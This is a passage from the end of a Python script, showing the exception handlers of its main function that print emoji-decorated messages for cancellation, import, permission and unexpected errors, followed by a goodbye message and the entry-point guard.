        print("\n🛑 Operation cancelled by user")
    except ImportError as e:
        print(f"❌ Import error: {e}")
        print("📋 Please ensure all dependencies are installed")
    except PermissionError as e:
        print(f"❌ Permission error: {e}")
        print("📋 Please check file permissions or run with appropriate privileges")
    except Exception as e:
        print(f"❌ Unexpected error: {str(e)}")
        print(traceback.format_exc())
        print("📋 Please check the logs for more details")
    finally:
        print("Goodbye! 👋")

if __name__ == "__main__":
    main()


